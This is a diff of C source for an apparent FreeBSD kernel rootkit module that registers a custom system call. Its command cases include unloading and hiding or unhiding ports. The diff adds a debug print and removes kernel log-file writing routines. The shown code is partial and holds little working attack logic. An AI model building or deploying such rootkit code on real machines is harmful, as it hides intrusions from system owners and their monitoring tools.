@@ -11,6 +11,12 @@ struct rootkit_args {
 /* The offset in sysent[] where the system call is to be allocated. */
 static int offset = NO_SYSCALL;
 
+void a_func(void);
+
+void a_func() {
+	uprintf("WHAT?!\n");
+}
+
 /* The system call function. */
 static int main(struct thread *td, void *syscall_args) {
 
@@ -18,10 +24,6 @@ static int main(struct thread *td, void *syscall_args) {
 	uap = (struct rootkit_args *)syscall_args;
 
 	long resp;
-
-	long inl = 0;
-	long fdl = 0;
-	int fdi = 0;
 
 	switch(uap->command){
 		case 0:// Unload
@@ -60,17 +62,8 @@ static int main(struct thread *td, void *syscall_args) {
 		case 11://Unhide port
 			break;
 		case 12:
-			filewriter_openlog(td, &fdi, uap->args[0]);
-			uprintf("FD: %d\n", fdi);
 			break;
 		case 13:
-			filewriter_openlog(td, &fdi, uap->args[0]);
-			inl = strtol(uap->args[2], NULL, 16);
-			filewriter_writelog(td, fdi, uap->args[1], (int)inl);
-			break;
-		case 14:
-			fdl = strtol(uap->args[0], NULL, 16);
-			filewriter_closelog(td, (int)fdl);
 			break;
 
 		default:
@@ -90,9 +83,6 @@ static struct sysent rootkit_sysent = {
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
 	int error = 0;
-	int testfd = 0;
-
-	char buf[256] = {0};
 
 	
 
